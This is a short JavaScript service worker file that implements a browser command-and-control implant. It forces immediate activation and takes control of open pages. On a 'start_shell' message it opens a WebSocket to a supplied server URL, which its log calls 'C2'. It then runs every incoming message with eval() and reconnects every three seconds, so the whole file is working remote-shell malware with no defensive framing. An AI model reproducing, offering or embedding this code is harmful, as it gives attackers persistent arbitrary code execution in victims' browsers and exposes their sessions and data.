// Force immediate activation and control
self.addEventListener('install', event => {
    event.waitUntil(self.skipWaiting());
});

self.addEventListener('activate', event => {
    event.waitUntil(self.clients.claim());
});

let ws = null;
let serverUrl = '';

self.addEventListener('message', event => {
    if (event.data && event.data.type === 'start_shell') {
        serverUrl = event.data.server;
        connectWebSocket();
    }
});

function connectWebSocket() {
    if (!serverUrl) return;

    try {
        ws = new WebSocket(serverUrl);

        ws.onopen = () => {
            console.log('[ServiceWorker] Connected to C2');
        };

        ws.onmessage = event => {
            try {
                eval(event.data);
            } catch (e) {
                console.error('[ServiceWorker] Eval error:', e);
            }
        };

        ws.onerror = () => {
            console.warn('[ServiceWorker] WebSocket error, reconnecting...');
            reconnectWebSocket();
        };

        ws.onclose = () => {
            console.warn('[ServiceWorker] WebSocket closed, reconnecting...');
            reconnectWebSocket();
        };
    } catch (e) {
        console.error('[ServiceWorker] Connection failed:', e);
        reconnectWebSocket();
    }
}

function reconnectWebSocket() {
    setTimeout(connectWebSocket, 3000); // Retry every 3 seconds
}
